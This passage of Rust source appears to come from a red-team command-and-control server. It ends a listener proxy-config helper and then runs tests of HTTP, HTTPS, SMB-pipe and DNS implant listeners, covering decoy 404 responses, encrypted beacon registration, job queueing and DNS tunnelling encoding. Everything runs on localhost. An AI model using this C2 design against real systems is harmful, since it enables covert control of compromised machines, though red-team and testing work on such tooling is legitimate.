) -> Result<Option<HttpListenerProxyConfig>, ListenerManagerError> {
    if !parse_bool("Proxy Enabled", info.proxy_enabled.as_deref())? {
        return Ok(None);
    }

    Ok(Some(HttpListenerProxyConfig {
        enabled: true,
        proxy_type: optional_trimmed(info.proxy_type.as_deref()),
        host: required_field("Proxy Host", info.proxy_host.as_deref())?.to_owned(),
        port: parse_u16("Proxy Port", info.proxy_port.as_deref())?,
        username: optional_trimmed(info.proxy_username.as_deref()),
        password: optional_trimmed(info.proxy_password.as_deref()),
    }))
}

#[cfg(test)]
mod tests {
    use std::net::TcpListener as StdTcpListener;
    use std::time::Duration;
    use std::time::{SystemTime, UNIX_EPOCH};

    use super::{
        ListenerEventAction, ListenerManager, ListenerManagerError, ListenerStatus,
        action_from_mark, listener_config_from_operator, operator_requests_start,
        smb_local_socket_name,
    };
    use crate::{AgentRegistry, Database, EventBus, Job};
    use axum::http::StatusCode;
    use base64::Engine as _;
    use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
    use interprocess::local_socket::tokio::Stream as LocalSocketStream;
    use interprocess::local_socket::traits::tokio::Stream as _;
    use red_cell_common::AgentEncryptionInfo;
    use red_cell_common::crypto::{
        AGENT_IV_LENGTH, AGENT_KEY_LENGTH, decrypt_agent_data, encrypt_agent_data,
    };
    use red_cell_common::demon::{DemonCommand, DemonEnvelope, DemonMessage};
    use red_cell_common::operator::{ListenerInfo, OperatorMessage};
    use red_cell_common::{
        HttpListenerConfig, HttpListenerResponseConfig, ListenerConfig, SmbListenerConfig,
    };
    use reqwest::Client;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::time::sleep;

    fn http_listener(name: &str, port: u16) -> ListenerConfig {
        ListenerConfig::from(HttpListenerConfig {
            name: name.to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["127.0.0.1".to_owned()],
            host_bind: "127.0.0.1".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: port,
            port_conn: Some(port),
            method: None,
            behind_redirector: false,
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/".to_owned()],
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        })
    }

    fn smb_listener(name: &str, pipe_name: &str) -> ListenerConfig {
        ListenerConfig::from(SmbListenerConfig {
            name: name.to_owned(),
            pipe_name: pipe_name.to_owned(),
            kill_date: None,
            working_hours: None,
        })
    }

    async fn manager() -> Result<ListenerManager, ListenerManagerError> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        Ok(ListenerManager::new(database, registry, EventBus::default()))
    }

    #[tokio::test]
    async fn create_and_list_persist_listener_state() -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        let summary = manager.create(http_listener("alpha", 32001)).await?;

        assert_eq!(summary.name, "alpha");
        assert_eq!(summary.state.status, ListenerStatus::Created);
        assert_eq!(manager.list().await?.len(), 1);

        Ok(())
    }

    #[tokio::test]
    async fn start_stop_and_delete_manage_runtime_handles() -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        manager.create(http_listener("alpha", 32002)).await?;

        let running = manager.start("alpha").await?;
        assert_eq!(running.state.status, ListenerStatus::Running);

        let stopped = manager.stop("alpha").await?;
        assert_eq!(stopped.state.status, ListenerStatus::Stopped);

        manager.delete("alpha").await?;
        assert!(matches!(
            manager.summary("alpha").await,
            Err(ListenerManagerError::ListenerNotFound { .. })
        ));

        Ok(())
    }

    #[tokio::test]
    async fn start_records_bind_errors() -> Result<(), ListenerManagerError> {
        let blocker = tokio::net::TcpListener::bind("127.0.0.1:32003")
            .await
            .map_err(|error| ListenerManagerError::InvalidConfig { message: error.to_string() })?;
        let manager = manager().await?;
        manager.create(http_listener("alpha", 32003)).await?;

        let error = manager.start("alpha").await.expect_err("bind should fail");
        let summary = manager.summary("alpha").await?;

        drop(blocker);

        assert!(matches!(error, ListenerManagerError::StartFailed { .. }));
        assert_eq!(summary.state.status, ListenerStatus::Error);
        assert!(summary.state.last_error.is_some());

        Ok(())
    }

    #[tokio::test]
    async fn http_listener_returns_fake_404_for_non_matching_requests()
    -> Result<(), Box<dyn std::error::Error>> {
        let manager = manager().await?;
        let port = available_port()?;
        let config = ListenerConfig::from(HttpListenerConfig {
            name: "edge-http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["127.0.0.1".to_owned()],
            host_bind: "127.0.0.1".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: port,
            port_conn: Some(port),
            method: Some("POST".to_owned()),
            behind_redirector: false,
            user_agent: Some("Agent-UA".to_owned()),
            headers: vec!["Accept-Encoding: gzip".to_owned(), "X-Auth: 123".to_owned()],
            uris: vec!["/submit".to_owned()],
            host_header: None,
            secure: false,
            cert: None,
            response: Some(HttpListenerResponseConfig {
                headers: vec![
                    "Server: ExampleFront".to_owned(),
                    "Content-Type: text/plain".to_owned(),
                ],
                body: Some("decoy".to_owned()),
            }),
            proxy: None,
        });

        manager.create(config).await?;
        manager.start("edge-http").await?;
        wait_for_listener(port, false).await?;

        let client = Client::new();

        let invalid = client.get(format!("http://127.0.0.1:{port}/nope")).send().await?;
        assert_eq!(invalid.status(), StatusCode::NOT_FOUND);
        assert_eq!(invalid.text().await?, "decoy");

        let valid = client
            .post(format!("http://127.0.0.1:{port}/submit"))
            .header("User-Agent", "Agent-UA")
            .header("X-Auth", "123")
            .body(valid_demon_request_body(0x1234_5678))
            .send()
            .await?;
        assert_eq!(valid.status(), StatusCode::OK);
        assert_eq!(
            valid.headers().get("server").and_then(|value| value.to_str().ok()),
            Some("ExampleFront")
        );
        assert_eq!(valid.text().await?, "decoy");

        manager.stop("edge-http").await?;
        Ok(())
    }

    #[tokio::test]
    async fn https_listener_generates_tls_and_accepts_requests()
    -> Result<(), Box<dyn std::error::Error>> {
        let manager = manager().await?;
        let port = available_port()?;
        let config = ListenerConfig::from(HttpListenerConfig {
            name: "edge-https".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["localhost".to_owned()],
            host_bind: "127.0.0.1".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: port,
            port_conn: Some(port),
            method: None,
            behind_redirector: false,
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/".to_owned()],
            host_header: None,
            secure: true,
            cert: None,
            response: Some(HttpListenerResponseConfig {
                headers: vec!["Server: TLSFront".to_owned()],
                body: Some("tls".to_owned()),
            }),
            proxy: None,
        });

        manager.create(config).await?;
        manager.start("edge-https").await?;
        wait_for_listener(port, true).await?;

        let client = Client::builder().danger_accept_invalid_certs(true).build()?;
        let response = client
            .post(format!("https://127.0.0.1:{port}/"))
            .body(valid_demon_request_body(1))
            .send()
            .await?;
        assert_eq!(response.status(), StatusCode::OK);
        assert_eq!(
            response.headers().get("server").and_then(|value| value.to_str().ok()),
            Some("TLSFront")
        );
        assert_eq!(response.text().await?, "tls");

        manager.stop("edge-https").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_returns_fake_404_for_invalid_demon_callback_body()
    -> Result<(), Box<dyn std::error::Error>> {
        let manager = manager().await?;
        let port = available_port()?;
        manager.create(http_listener("edge-http-invalid", port)).await?;
        manager.start("edge-http-invalid").await?;
        wait_for_listener(port, false).await?;

        let client = Client::new();

        let too_short =
            client.post(format!("http://127.0.0.1:{port}/")).body(vec![0_u8; 8]).send().await?;
        assert_eq!(too_short.status(), StatusCode::NOT_FOUND);

        let mut invalid_magic = valid_demon_request_body(0x0102_0304);
        invalid_magic[4..8].copy_from_slice(&0xFEED_FACE_u32.to_be_bytes());
        let invalid_magic =
            client.post(format!("http://127.0.0.1:{port}/")).body(invalid_magic).send().await?;
        assert_eq!(invalid_magic.status(), StatusCode::NOT_FOUND);

        manager.stop("edge-http-invalid").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_registers_demon_init_and_broadcasts_agent_event()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let manager = ListenerManager::new(database.clone(), registry.clone(), events.clone());
        let mut event_receiver = events.subscribe();
        let port = available_port()?;

        manager.create(http_listener("edge-http-init", port)).await?;
        manager.start("edge-http-init").await?;
        wait_for_listener(port, false).await?;

        let key = [0x41; AGENT_KEY_LENGTH];
        let iv = [0x24; AGENT_IV_LENGTH];
        let response = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_init_body(0x1234_5678, key, iv))
            .send()
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        let decrypted = decrypt_agent_data(&key, &iv, &response.bytes().await?)?;
        assert_eq!(decrypted.as_slice(), &0x1234_5678_u32.to_le_bytes());

        let stored = registry.get(0x1234_5678).await.expect("agent should be registered");
        assert_eq!(stored.hostname, "wkstn-01");
        assert_eq!(stored.external_ip, "0.0.0.0");
        assert_eq!(database.agents().get(0x1234_5678).await?, Some(stored.clone()));

        let event = event_receiver.recv().await.expect("agent registration should broadcast");
        let OperatorMessage::AgentNew(message) = event else {
            panic!("unexpected operator event");
        };
        assert_eq!(message.info.name_id, "12345678");
        assert_eq!(message.info.listener, "edge-http-init");
        assert_eq!(message.info.process_name, "explorer.exe");
        assert_eq!(message.info.sleep_delay, serde_json::json!(15));
        manager.stop("edge-http-init").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_returns_empty_body_when_agent_has_no_jobs()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let manager = ListenerManager::new(database, registry.clone(), EventBus::default());
        let port = available_port()?;
        let key = [0x51; AGENT_KEY_LENGTH];
        let iv = [0x19; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        manager.create(http_listener("edge-http-empty-jobs", port)).await?;
        manager.start("edge-http-empty-jobs").await?;
        wait_for_listener(port, false).await?;

        let response = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_callback_body(
                agent_id,
                key,
                iv,
                u32::from(DemonCommand::CommandGetJob),
                7,
                &[],
            ))
            .send()
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        assert!(response.bytes().await?.is_empty());

        manager.stop("edge-http-empty-jobs").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_serializes_all_queued_jobs_for_get_job()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let manager = ListenerManager::new(database, registry.clone(), EventBus::default());
        let port = available_port()?;
        let key = [0x61; AGENT_KEY_LENGTH];
        let iv = [0x27; AGENT_IV_LENGTH];
        let agent_id = 0x5566_7788;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandSleep),
                    request_id: 41,
                    payload: vec![1, 2, 3, 4],
                    command_line: "sleep 10".to_owned(),
                    task_id: "task-41".to_owned(),
                    created_at: "2026-03-09T20:10:00Z".to_owned(),
                },
            )
            .await?;
        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandCheckin),
                    request_id: 42,
                    payload: vec![5, 6, 7],
                    command_line: "checkin".to_owned(),
                    task_id: "task-42".to_owned(),
                    created_at: "2026-03-09T20:11:00Z".to_owned(),
                },
            )
            .await?;
        manager.create(http_listener("edge-http-jobs", port)).await?;
        manager.start("edge-http-jobs").await?;
        wait_for_listener(port, false).await?;

        let response = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_callback_body(
                agent_id,
                key,
                iv,
                u32::from(DemonCommand::CommandGetJob),
                9,
                &[],
            ))
            .send()
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        let bytes = response.bytes().await?;
        let message = DemonMessage::from_bytes(bytes.as_ref())?;
        assert_eq!(message.packages.len(), 2);
        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
        assert_eq!(message.packages[0].request_id, 41);
        assert_eq!(decrypt_agent_data(&key, &iv, &message.packages[0].payload)?, vec![1, 2, 3, 4]);
        assert_eq!(message.packages[1].command_id, u32::from(DemonCommand::CommandCheckin));
        assert_eq!(message.packages[1].request_id, 42);
        assert_eq!(decrypt_agent_data(&key, &iv, &message.packages[1].payload)?, vec![5, 6, 7]);
        assert!(registry.queued_jobs(agent_id).await?.is_empty());

        manager.stop("edge-http-jobs").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_checkin_updates_last_call_in_and_broadcasts_agent_update()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let manager = ListenerManager::new(database.clone(), registry.clone(), events.clone());
        let mut event_receiver = events.subscribe();
        let port = available_port()?;
        let key = [0x71; AGENT_KEY_LENGTH];
        let iv = [0x37; AGENT_IV_LENGTH];
        let agent_id = 0xCAFE_BABE;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        let before = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist before checkin".to_owned())?
            .last_call_in;

        manager.create(http_listener("edge-http-checkin", port)).await?;
        manager.start("edge-http-checkin").await?;
        wait_for_listener(port, false).await?;

        let response = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_multi_callback_body(
                agent_id,
                key,
                iv,
                (u32::from(DemonCommand::CommandGetJob), 5, Vec::new()),
                &[(u32::from(DemonCommand::CommandCheckin), 6, vec![0xaa, 0xbb])],
            ))
            .send()
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        assert!(response.bytes().await?.is_empty());

        let updated =
            registry.get(agent_id).await.ok_or_else(|| "agent should still exist".to_owned())?;
        assert_ne!(updated.last_call_in, before);
        assert_eq!(
            database
                .agents()
                .get(agent_id)
                .await?
                .ok_or_else(|| "agent should be persisted".to_owned())?
                .last_call_in,
            updated.last_call_in
        );

        let event = event_receiver
            .recv()
            .await
            .ok_or_else(|| "agent update event should broadcast".to_owned())?;
        let OperatorMessage::AgentUpdate(message) = event else {
            panic!("unexpected operator event");
        };
        assert_eq!(message.info.agent_id, format!("{agent_id:08X}"));
        assert_eq!(message.info.marked, "Alive");

        manager.stop("edge-http-checkin").await?;
        Ok(())
    }

    #[tokio::test]
    async fn smb_listener_registers_demon_init_and_returns_framed_ack()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let manager = ListenerManager::new(database.clone(), registry.clone(), events.clone());
        let mut event_receiver = events.subscribe();
        let pipe_name = unique_smb_pipe_name("init");

        manager.create(smb_listener("edge-smb-init", &pipe_name)).await?;
        manager.start("edge-smb-init").await?;
        wait_for_smb_listener(&pipe_name).await?;

        let key = [0x41; AGENT_KEY_LENGTH];
        let iv = [0x24; AGENT_IV_LENGTH];
        let mut stream = connect_smb_stream(&pipe_name).await?;
        write_test_smb_frame(
            &mut stream,
            0x1234_5678,
            &valid_demon_init_body(0x1234_5678, key, iv),
        )
        .await?;

        let (agent_id, response) = read_test_smb_frame(&mut stream).await?;
        assert_eq!(agent_id, 0x1234_5678);
        let decrypted = decrypt_agent_data(&key, &iv, &response)?;
        assert_eq!(decrypted.as_slice(), &0x1234_5678_u32.to_le_bytes());

        let stored = registry.get(0x1234_5678).await.expect("agent should be registered");
        assert_eq!(stored.hostname, "wkstn-01");
        assert_eq!(stored.external_ip, "127.0.0.1");
        assert_eq!(database.agents().get(0x1234_5678).await?, Some(stored.clone()));

        let event = event_receiver.recv().await.expect("agent registration should broadcast");
        let OperatorMessage::AgentNew(message) = event else {
            panic!("unexpected operator event");
        };
        assert_eq!(message.info.listener, "edge-smb-init");

        manager.stop("edge-smb-init").await?;
        Ok(())
    }

    #[tokio::test]
    async fn smb_listener_serializes_all_queued_jobs_for_get_job()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let manager = ListenerManager::new(database, registry.clone(), EventBus::default());
        let pipe_name = unique_smb_pipe_name("jobs");
        let key = [0x61; AGENT_KEY_LENGTH];
        let iv = [0x27; AGENT_IV_LENGTH];
        let agent_id = 0x5566_7788;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandSleep),
                    request_id: 41,
                    payload: vec![1, 2, 3, 4],
                    command_line: "sleep 10".to_owned(),
                    task_id: "task-41".to_owned(),
                    created_at: "2026-03-09T20:10:00Z".to_owned(),
                },
            )
            .await?;
        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandCheckin),
                    request_id: 42,
                    payload: vec![5, 6, 7],
                    command_line: "checkin".to_owned(),
                    task_id: "task-42".to_owned(),
                    created_at: "2026-03-09T20:11:00Z".to_owned(),
                },
            )
            .await?;
        manager.create(smb_listener("edge-smb-jobs", &pipe_name)).await?;
        manager.start("edge-smb-jobs").await?;
        wait_for_smb_listener(&pipe_name).await?;

        let mut stream = connect_smb_stream(&pipe_name).await?;
        write_test_smb_frame(
            &mut stream,
            agent_id,
            &valid_demon_callback_body(
                agent_id,
                key,
                iv,
                u32::from(DemonCommand::CommandGetJob),
                9,
                &[],
            ),
        )
        .await?;

        let (response_agent_id, response_bytes) = read_test_smb_frame(&mut stream).await?;
        assert_eq!(response_agent_id, agent_id);
        let message = DemonMessage::from_bytes(response_bytes.as_ref())?;
        assert_eq!(message.packages.len(), 2);
        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
        assert_eq!(message.packages[0].request_id, 41);
        assert_eq!(decrypt_agent_data(&key, &iv, &message.packages[0].payload)?, vec![1, 2, 3, 4]);
        assert_eq!(message.packages[1].command_id, u32::from(DemonCommand::CommandCheckin));
        assert_eq!(message.packages[1].request_id, 42);
        assert_eq!(decrypt_agent_data(&key, &iv, &message.packages[1].payload)?, vec![5, 6, 7]);
        assert!(registry.queued_jobs(agent_id).await?.is_empty());

        manager.stop("edge-smb-jobs").await?;
        Ok(())
    }

    #[test]
    fn operator_payload_maps_to_http_listener_config() -> Result<(), ListenerManagerError> {
        let info = ListenerInfo {
            name: Some("alpha".to_owned()),
            protocol: Some("Https".to_owned()),
            status: Some("Online".to_owned()),
            hosts: Some("a.example, b.example".to_owned()),
            host_bind: Some("0.0.0.0".to_owned()),
            host_rotation: Some("round-robin".to_owned()),
            port_bind: Some("8443".to_owned()),
            port_conn: Some("443".to_owned()),
            headers: Some("X-Test: true".to_owned()),
            uris: Some("/one, /two".to_owned()),
            user_agent: Some("Mozilla/5.0".to_owned()),
            secure: Some("true".to_owned()),
            ..ListenerInfo::default()
        };

        let config = listener_config_from_operator(&info)?;

        assert!(operator_requests_start(&info));
        match config {
            ListenerConfig::Http(config) => {
                assert_eq!(config.name, "alpha");
                assert!(config.secure);
                assert_eq!(config.hosts, vec!["a.example".to_owned(), "b.example".to_owned()]);
            }
            other => panic!("unexpected config: {other:?}"),
        }

        Ok(())
    }

    #[test]
    fn operator_payload_maps_to_smb_listener_config() -> Result<(), ListenerManagerError> {
        let mut info = ListenerInfo {
            name: Some("pivot".to_owned()),
            protocol: Some("SMB".to_owned()),
            ..ListenerInfo::default()
        };
        info.extra.insert("PipeName".to_owned(), serde_json::json!(r"pivot-01"));

        let config = listener_config_from_operator(&info)?;
        match config {
            ListenerConfig::Smb(config) => {
                assert_eq!(config.name, "pivot");
                assert_eq!(config.pipe_name, "pivot-01");
            }
            other => panic!("unexpected config: {other:?}"),
        }

        Ok(())
    }

    #[test]
    fn mark_actions_accept_start_and_stop_aliases() -> Result<(), ListenerManagerError> {
        assert_eq!(action_from_mark("online")?, ListenerEventAction::Started);
        assert_eq!(action_from_mark("stop")?, ListenerEventAction::Stopped);
        assert!(matches!(
            action_from_mark("restart"),
            Err(ListenerManagerError::UnsupportedMark { .. })
        ));

        Ok(())
    }

    fn available_port() -> Result<u16, Box<dyn std::error::Error>> {
        let listener = StdTcpListener::bind("127.0.0.1:0")?;
        let port = listener.local_addr()?.port();
        drop(listener);
        Ok(port)
    }

    async fn wait_for_listener(port: u16, secure: bool) -> Result<(), Box<dyn std::error::Error>> {
        let client = Client::builder().danger_accept_invalid_certs(true).build()?;
        let scheme = if secure { "https" } else { "http" };
        let url = format!("{scheme}://127.0.0.1:{port}/");

        for _ in 0..40 {
            match client.get(&url).send().await {
                Ok(_) => return Ok(()),
                Err(_) => sleep(Duration::from_millis(25)).await,
            }
        }

        Err(format!("listener on port {port} did not become ready").into())
    }

    async fn wait_for_smb_listener(pipe_name: &str) -> Result<(), Box<dyn std::error::Error>> {
        for _ in 0..40 {
            match connect_smb_stream(pipe_name).await {
                Ok(stream) => {
                    drop(stream);
                    return Ok(());
                }
                Err(_) => sleep(Duration::from_millis(25)).await,
            }
        }

        Err(format!("smb listener `{pipe_name}` did not become ready").into())
    }

    async fn connect_smb_stream(
        pipe_name: &str,
    ) -> Result<LocalSocketStream, Box<dyn std::error::Error>> {
        let socket_name = smb_local_socket_name(pipe_name)?;
        Ok(LocalSocketStream::connect(socket_name).await?)
    }

    async fn write_test_smb_frame(
        stream: &mut LocalSocketStream,
        agent_id: u32,
        payload: &[u8],
    ) -> Result<(), Box<dyn std::error::Error>> {
        stream.write_u32_le(agent_id).await?;
        stream.write_u32_le(u32::try_from(payload.len())?).await?;
        stream.write_all(payload).await?;
        stream.flush().await?;
        Ok(())
    }

    async fn read_test_smb_frame(
        stream: &mut LocalSocketStream,
    ) -> Result<(u32, Vec<u8>), Box<dyn std::error::Error>> {
        let agent_id = stream.read_u32_le().await?;
        let payload_len = usize::try_from(stream.read_u32_le().await?)?;
        let mut payload = vec![0_u8; payload_len];
        stream.read_exact(&mut payload).await?;
        Ok((agent_id, payload))
    }

    fn unique_smb_pipe_name(suffix: &str) -> String {
        let unique = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|duration| duration.as_nanos())
            .unwrap_or_default();
        format!("red-cell-test-{suffix}-{unique}")
    }

    fn valid_demon_request_body(agent_id: u32) -> Vec<u8> {
        let payload = [
            u32::from(DemonCommand::DemonInit).to_be_bytes().as_slice(),
            7_u32.to_be_bytes().as_slice(),
        ]
        .concat();

        DemonEnvelope::new(agent_id, payload)
            .unwrap_or_else(|error| {
                panic!("failed to build valid demon request body: {error}");
            })
            .to_bytes()
    }

    fn sample_agent_info(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> red_cell_common::AgentInfo {
        red_cell_common::AgentInfo {
            agent_id,
            active: true,
            reason: String::new(),
            note: String::new(),
            encryption: AgentEncryptionInfo {
                aes_key: BASE64_STANDARD.encode(key),
                aes_iv: BASE64_STANDARD.encode(iv),
            },
            hostname: "wkstn-01".to_owned(),
            username: "operator".to_owned(),
            domain_name: "REDCELL".to_owned(),
            external_ip: "203.0.113.10".to_owned(),
            internal_ip: "10.0.0.25".to_owned(),
            process_name: "explorer.exe".to_owned(),
            base_address: 0x401000,
            process_pid: 1337,
            process_tid: 1338,
            process_ppid: 512,
            process_arch: "x64".to_owned(),
            elevated: true,
            os_version: "Windows 11".to_owned(),
            os_arch: "x64".to_owned(),
            sleep_delay: 15,
            sleep_jitter: 20,
            kill_date: Some(1_893_456_000),
            working_hours: Some(0b101010),
            first_call_in: "2026-03-09T19:00:00Z".to_owned(),
            last_call_in: "2026-03-09T19:01:00Z".to_owned(),
        }
    }

    fn valid_demon_init_body(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> Vec<u8> {
        let mut metadata = Vec::new();
        metadata.extend_from_slice(&agent_id.to_be_bytes());
        add_length_prefixed_bytes(&mut metadata, b"wkstn-01");
        add_length_prefixed_bytes(&mut metadata, b"operator");
        add_length_prefixed_bytes(&mut metadata, b"REDCELL");
        add_length_prefixed_bytes(&mut metadata, b"10.0.0.25");
        add_length_prefixed_utf16(&mut metadata, "C:\\Windows\\explorer.exe");
        metadata.extend_from_slice(&1337_u32.to_be_bytes());
        metadata.extend_from_slice(&1338_u32.to_be_bytes());
        metadata.extend_from_slice(&512_u32.to_be_bytes());
        metadata.extend_from_slice(&2_u32.to_be_bytes());
        metadata.extend_from_slice(&1_u32.to_be_bytes());
        metadata.extend_from_slice(&0x401000_u64.to_be_bytes());
        metadata.extend_from_slice(&10_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());
        metadata.extend_from_slice(&1_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());
        metadata.extend_from_slice(&22000_u32.to_be_bytes());
        metadata.extend_from_slice(&9_u32.to_be_bytes());
        metadata.extend_from_slice(&15_u32.to_be_bytes());
        metadata.extend_from_slice(&20_u32.to_be_bytes());
        metadata.extend_from_slice(&1_893_456_000_u64.to_be_bytes());
        metadata.extend_from_slice(&0b101010_u32.to_be_bytes());

        let encrypted = red_cell_common::crypto::encrypt_agent_data(&key, &iv, &metadata);
        let payload = [
            u32::from(DemonCommand::DemonInit).to_be_bytes().as_slice(),
            7_u32.to_be_bytes().as_slice(),
            key.as_slice(),
            iv.as_slice(),
            encrypted.as_slice(),
        ]
        .concat();

        DemonEnvelope::new(agent_id, payload)
            .unwrap_or_else(|error| panic!("failed to build demon init request body: {error}"))
            .to_bytes()
    }

    fn valid_demon_callback_body(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
        command_id: u32,
        request_id: u32,
        payload: &[u8],
    ) -> Vec<u8> {
        valid_demon_multi_callback_body(
            agent_id,
            key,
            iv,
            (command_id, request_id, payload.to_vec()),
            &[],
        )
    }

    fn valid_demon_multi_callback_body(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
        first: (u32, u32, Vec<u8>),
        additional: &[(u32, u32, Vec<u8>)],
    ) -> Vec<u8> {
        let mut decrypted = Vec::new();
        decrypted
            .extend_from_slice(&u32::try_from(first.2.len()).unwrap_or_default().to_be_bytes());
        decrypted.extend_from_slice(&first.2);

        for (command_id, request_id, payload) in additional {
            decrypted.extend_from_slice(&command_id.to_be_bytes());
            decrypted.extend_from_slice(&request_id.to_be_bytes());
            decrypted
                .extend_from_slice(&u32::try_from(payload.len()).unwrap_or_default().to_be_bytes());
            decrypted.extend_from_slice(payload);
        }

        let encrypted = encrypt_agent_data(&key, &iv, &decrypted);
        let payload = [
            first.0.to_be_bytes().as_slice(),
            first.1.to_be_bytes().as_slice(),
            encrypted.as_slice(),
        ]
        .concat();

        DemonEnvelope::new(agent_id, payload)
            .unwrap_or_else(|error| panic!("failed to build demon callback request body: {error}"))
            .to_bytes()
    }

    fn add_length_prefixed_bytes(buf: &mut Vec<u8>, bytes: &[u8]) {
        buf.extend_from_slice(&u32::try_from(bytes.len()).unwrap_or_default().to_be_bytes());
        buf.extend_from_slice(bytes);
    }

    fn add_length_prefixed_utf16(buf: &mut Vec<u8>, value: &str) {
        let encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
        add_length_prefixed_bytes(buf, &encoded);
    }

    // ── DNS C2 unit tests ─────────────────────────────────────────────────────

    use super::{
        base32hex_decode, base32hex_encode, build_dns_txt_response, chunk_response_to_b32hex,
        parse_dns_c2_query, parse_dns_query, DNS_HEADER_LEN, DNS_TYPE_TXT,
    };
    use tokio::net::UdpSocket as TokioUdpSocket;

    fn free_udp_port() -> u16 {
        // Bind on :0 to let the OS pick an ephemeral port, then return it.
        let sock = std::net::UdpSocket::bind("127.0.0.1:0")
            .expect("failed to bind ephemeral UDP socket");
        sock.local_addr().expect("failed to read local addr").port()
    }

    fn dns_listener_config(name: &str, port: u16, domain: &str) -> ListenerConfig {
        ListenerConfig::from(red_cell_common::DnsListenerConfig {
            name: name.to_owned(),
            host_bind: "127.0.0.1".to_owned(),
            port_bind: port,
            domain: domain.to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        })
    }

    /// Build a minimal DNS TXT query packet for `qname`.
    fn build_dns_txt_query(id: u16, qname: &str) -> Vec<u8> {
        let mut buf = Vec::new();
        // Header
        buf.extend_from_slice(&id.to_be_bytes());
        buf.extend_from_slice(&0x0100u16.to_be_bytes()); // flags: QR=0, RD=1
        buf.extend_from_slice(&1u16.to_be_bytes()); // qdcount
        buf.extend_from_slice(&0u16.to_be_bytes()); // ancount
        buf.extend_from_slice(&0u16.to_be_bytes()); // nscount
        buf.extend_from_slice(&0u16.to_be_bytes()); // arcount
        // QNAME
        for label in qname.split('.') {
            buf.push(label.len() as u8);
            buf.extend_from_slice(label.as_bytes());
        }
        buf.push(0); // zero terminator
        buf.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes()); // QTYPE
        buf.extend_from_slice(&1u16.to_be_bytes()); // QCLASS IN
        buf
    }

    #[test]
    fn base32hex_encode_and_decode_round_trip() {
        let cases: &[&[u8]] = &[
            b"hello",
            b"",
            b"\x00\xff\xaa",
            b"The quick brown fox jumps over the lazy dog",
        ];
        for &data in cases {
            let encoded = base32hex_encode(data);
            let decoded = base32hex_decode(&encoded).expect("decode failed");
            assert_eq!(decoded, data, "round trip failed for {data:?}");
        }
    }

    #[test]
    fn base32hex_decode_is_case_insensitive() {
        let lower = base32hex_decode("c9gq6u").expect("lower decode failed");
        let upper = base32hex_decode("C9GQ6U").expect("upper decode failed");
        assert_eq!(lower, upper);
    }

    #[test]
    fn base32hex_decode_rejects_invalid_characters() {
